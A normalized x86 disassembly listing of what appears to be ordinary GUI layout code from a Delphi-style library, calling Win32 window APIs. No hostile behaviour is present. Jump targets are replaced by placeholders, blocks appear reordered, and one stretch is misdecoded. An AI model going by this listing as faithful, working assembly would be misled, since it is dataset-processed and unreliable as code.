jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4185f0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_41877c
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_418700
call sub_44f7d8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_418700
call sub_44f7d8
sub_44f558
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_44f480
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_44f5b8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_44f7d8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
test eax eax
jne r-xdata
sub_44f61c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44a198
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov eax ebx
call sub_44c508
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c4cc
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44c4cc
test [ eax + 0x52 ] 0x4
je r-xdata
sub_44f6e0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_44894c
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_44f718
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_4607d8
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_44f758
push ebx
mov ebx eax
mov eax ebx
call sub_4607d8
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_464544
pop ebx
retn
mov eax ebx
call sub_460800
mov eax ebx
call sub_44f7d8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_44f790
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f7b4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_44f7b4
sub_44f7ec
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_4170c4
mov eax edi
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44c4cc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_44f880
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_44f7d8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_44f8b8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44fadc
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7d8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403324
sub_44f974
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41875c
pop esi
pop ebx
retn
sub_44f998
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f974
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4185f0
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41877c
sub_44fa0c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_44fadc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44a198
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44fa6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44fad0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fad7
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403324
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4057cc
sub_44fae8
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4485d8
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44fba0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_418700
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_4185a4
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403324
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_44fc00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44fcf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403324
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fcfd
mov eax [ ebp - 0x14 ]
call sub_403128
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41875c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_418700
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403324
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44fd0c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_44fc00
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44fd38
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4607d8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44fc00
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_44fc00
mov edx eax
mov eax esi
call sub_464444
sub_44fd7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c508
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44fdc4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44f480
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44921c
sub_44fe0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44fe90
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_44fadc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_44c508
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_450252
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_44c508
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_44fe0c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44c4cc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_450269
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44fe90
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44a034
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4502a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44aeb8
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4488ec
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_4502f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b0d8
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_450320
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44fadc
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44c070
xor ecx ecx
push ebp
push sub_45044f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c508
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450456
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c4cc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_450456
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403324
jmp r-xdata
